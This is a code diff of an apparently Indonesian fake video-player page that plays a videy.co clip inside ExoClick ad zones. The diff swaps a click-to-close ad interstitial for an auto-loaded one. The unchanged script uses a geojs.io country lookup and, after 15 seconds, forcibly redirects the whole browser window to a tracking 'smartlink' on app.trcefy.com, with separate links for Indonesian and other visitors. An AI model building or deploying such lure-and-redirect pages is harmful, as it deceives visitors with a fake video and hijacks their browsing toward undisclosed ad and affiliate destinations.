@@ -109,7 +109,6 @@ place-items:center;
 }
 
 .phone{
-position:relative;
 width:clamp(240px,92vw,420px);
 aspect-ratio:9/16;
 border-radius:22px;
@@ -121,87 +120,6 @@ background:#000;
 width:100%;
 height:100%;
 object-fit:cover;
-}
-
-/* ==============================
-   TOMBOL PLAY
-   ============================== */
-
-.play-overlay{
-position:absolute;
-inset:0;
-z-index:5;
-display:flex;
-align-items:center;
-justify-content:center;
-background:rgba(0,0,0,.08);
-cursor:pointer;
-}
-
-.play-button{
-width:72px;
-height:72px;
-border:0;
-border-radius:50%;
-background:#fff;
-color:#111827;
-font-size:28px;
-display:flex;
-align-items:center;
-justify-content:center;
-box-shadow:0 5px 25px rgba(0,0,0,.35);
-cursor:pointer;
-}
-
-.play-button span{
-margin-left:4px;
-}
-
-.play-overlay.hidden{
-display:none;
-}
-
-/* ==============================
-   INTERSTITIAL CONTAINER
-   ============================== */
-
-#interstitial-layer{
-position:fixed;
-inset:0;
-z-index:99999;
-display:none;
-align-items:center;
-justify-content:center;
-background:rgba(0,0,0,.88);
-padding:15px;
-}
-
-#interstitial-box{
-position:relative;
-width:min(100%,500px);
-min-height:250px;
-background:#fff;
-border-radius:12px;
-overflow:hidden;
-display:flex;
-align-items:center;
-justify-content:center;
-}
-
-#close-ad{
-position:absolute;
-right:8px;
-top:8px;
-z-index:10;
-width:32px;
-height:32px;
-border:0;
-border-radius:50%;
-background:#111827;
-color:#fff;
-font-size:18px;
-cursor:pointer;
-display:none;
 }
 
 .meta{
@@ -243,16 +161,9 @@ Advertise
 <source src="https://cdn2.videy.co/07NDkyml1.mp4" type="video/mp4">
 </video>
 
-<!-- PLAY OVERLAY -->
-<div id="playOverlay" class="play-overlay">
-<button id="playButton" class="play-button" aria-label="Putar video">
-<span>▶</span>
-</button>
 </div>
 
-</div>
-
-<div class="meta" id="meta">
+<div class="meta">
 0:00 / 3:57 • Putar untuk memulai
 </div>
 
@@ -260,22 +171,18 @@ Advertise
 </main>
 
 
-<!-- ==================================================
+<!-- ==============================
      EXOCLICK WIDGET
-     ZONE 5951012
-     ================================================== -->
+     ID ZONA: 5951012
+     ============================== -->
 
 <div id="exoclick-widget-5951012"
 style="width:100%;display:flex;justify-content:center;align-items:center;overflow:hidden;">
 
-<script async
-type="application/javascript"
+<script async type="application/javascript"
 src="https://a.magsrv.com/ad-provider.js"></script>
 
-<ins
-class="eas6a97888e20"
-data-zoneid="5951012">
-</ins>
+<ins class="eas6a97888e20" data-zoneid="5951012"></ins>
 
 <script>
 (AdProvider = window.AdProvider || []).push({"serve": {}});
@@ -284,23 +191,12 @@ data-zoneid="5951012">
 </div>
 
 
-<!-- ==================================================
-     INTERSTITIAL LAYER
-     ZONE 6031412
-     ================================================== -->
+<!-- ==============================
+     EXOCLICK INTERSTITIAL
+     ID ZONA: 6031412
+     ============================== -->
 
-<div id="interstitial-layer">
-
-<div id="interstitial-box">
-
-<button id="close-ad" aria-label="Tutup iklan">
-×
-</button>
-
-<div id="exoclick-interstitial-6031412">
-
-<script async
-type="application/javascript"
+<script async type="application/javascript"
 src="https://a.pemsrv.com/ad-provider.js"></script>
 
 <ins
@@ -312,175 +208,59 @@ data-zoneid="6031412">
 (AdProvider = window.AdProvider || []).push({"serve": {}});
 </script>
 
-</div>
 
-</div>
-
-</div>
-
-
-<!-- ==================================================
-     VIDEO + INTERSTITIAL CONTROL
-     ================================================== -->
+<!-- ==============================
+     INTERSTITIAL DIPICU SAAT VIDEO
+     DIMULAI
+     ============================== -->
 
 <script>
-
 const v = document.getElementById('video');
-const meta = document.getElementById('meta');
+const meta = document.querySelector('.meta');
 
-const playOverlay = document.getElementById('playOverlay');
-const playButton = document.getElementById('playButton');
-
-const interstitialLayer =
-document.getElementById('interstitial-layer');
-
-const closeAd =
-document.getElementById('close-ad');
-
-let adOpened = false;
-let videoStarted = false;
-
-
-/*
-==================================================
-KLIK PLAY
-==================================================
-*/
-
-playButton.addEventListener('click', function(e){
-
-e.preventDefault();
-e.stopPropagation();
-
-if(videoStarted) return;
-
-adOpened = true;
-
-interstitialLayer.style.display = 'flex';
-
-});
-
-
-/*
-==================================================
-SETELAH IKLAN DITUTUP
-VIDEO MULAI
-==================================================
-*/
-
-closeAd.addEventListener('click', function(){
-
-interstitialLayer.style.display = 'none';
-
-videoStarted = true;
-
-playOverlay.classList.add('hidden');
-
-v.play().catch(function(){
-
-playOverlay.classList.remove('hidden');
-
-});
-
-});
-
-
-/*
-==================================================
-FALLBACK:
-JIKA PROVIDER TIDAK MEMBERIKAN TOMBOL CLOSE,
-TOMBOL CLOSE MUNCUL SETELAH BEBERAPA DETIK.
-==================================================
-*/
-
-setTimeout(function(){
-
-if(adOpened){
-
-closeAd.style.display = 'block';
-
-}
-
-},5000);
-
-
-/*
-==================================================
-JIKA VIDEO DIPUTAR DARI CONTROL BAWAAN
-TETAP TAHAN SEBELUM PLAY PERTAMA
-==================================================
-*/
+let interstitialShown = false;
 
 v.addEventListener('play', function(){
 
-if(!videoStarted){
+  if(interstitialShown) return;
 
-v.pause();
+  interstitialShown = true;
 
-interstitialLayer.style.display = 'flex';
-
-}
+  /*
+   * Memberi kesempatan widget 6031412
+   * untuk diproses sebelum video berjalan.
+   */
+  setTimeout(function(){
+    if(v.paused){
+      v.play().catch(()=>{});
+    }
+  }, 500);
 
 });
 
-
-/*
-==================================================
-FORMAT WAKTU
-==================================================
-*/
 
 function fmt(t){
-
-const m = Math.floor(t/60);
-
-const s =
-Math.floor(t%60)
-.toString()
-.padStart(2,'0');
-
-return `${m}:${s}`;
-
+  const m = Math.floor(t/60);
+  const s = Math.floor(t%60).toString().padStart(2,'0');
+  return `${m}:${s}`;
 }
 
-
-/*
-==================================================
-UPDATE DURASI
-==================================================
-*/
-
-v.addEventListener('loadedmetadata', function(){
-
-meta.textContent =
-`0:00 / ${fmt(v.duration)}`;
-
+v.addEventListener('loadedmetadata', ()=>{
+  meta.textContent = `0:00 / ${fmt(v.duration)}`;
 });
 
-
-/*
-==================================================
-UPDATE PROGRESS
-==================================================
-*/
-
-v.addEventListener('timeupdate', function(){
-
-meta.textContent =
-`${fmt(v.currentTime)} / ${fmt(v.duration)}`;
-
+v.addEventListener('timeupdate', ()=>{
+  meta.textContent = `${fmt(v.currentTime)} / ${fmt(v.duration)}`;
 });
-
 </script>
 
 
-<!-- ==================================================
+<!-- ==============================
      DIRECT LINK / GEOJS
-     ================================================== -->
+     ============================== -->
 
 <script>
-
-var LINK_ID =
+var LINK_ID  =
 "https://app.trcefy.com/sl?id=6a2050db46d3cf0d62f32aa4&pid=2&sub2=u831154&sub6=s2smartLink&sub5=s1SUBID1HERE";
 
 var LINK_ALL =
@@ -490,22 +270,17 @@ var DELAY = 15000;
 
 function geoip(g){
 
-setTimeout(function(){
+  setTimeout(function(){
 
-if(g && g.country === "ID"){
+    if(g && g.country === "ID"){
+      window.top.location.href = LINK_ID;
+    }else{
+      window.top.location.href = LINK_ALL;
+    }
 
-window.top.location.href = LINK_ID;
-
-}else{
-
-window.top.location.href = LINK_ALL;
-
-}
-
-}, DELAY);
+  }, DELAY);
 
 }
-
 </script>
 
 <script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>
